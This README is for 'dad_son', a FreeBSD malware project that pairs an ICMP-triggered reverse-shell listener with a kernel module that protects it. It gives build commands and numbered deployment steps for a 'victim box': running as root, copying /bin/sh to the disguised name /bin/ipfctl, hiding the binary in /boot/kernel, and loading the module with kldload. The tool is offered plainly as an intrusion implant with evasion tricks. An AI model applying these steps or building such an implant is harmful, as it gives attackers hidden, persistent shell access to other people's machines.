# dad_son

Malware that listens for ICMP echo requests with a code of 1 and sends back a shell to that IP, and a FreeBSD kernel module that protects that listener/shell giver. This readme will be expanded later on.

## Requirements

libpcap, and the executable that you want to run on ping as /bin/ipfctl. stdin, out, and err are redirected from son to this executable.

## Build

To compile dad.ko, simply run make on a system with the FreeBSD kernel source tree of your choice in /usr/src. To compile son, run `gcc -o son son.c -lpcap`.

## Steps to Deploy
1. Transfer dad.ko and son to victim box. SCP? detcord?
2. Make sure you are the root user
3. Copy /bin/sh to /bin/ipfctl `cp /bin/sh /bin/ipfctl`
4. Copy son into /boot/kernel `cp son /boot/kernel/.`
5. Load dad Kernel Module `kldload ./dad.ko`
6. Start son binary `./ipfctl.sh`
7. Verify that things are working
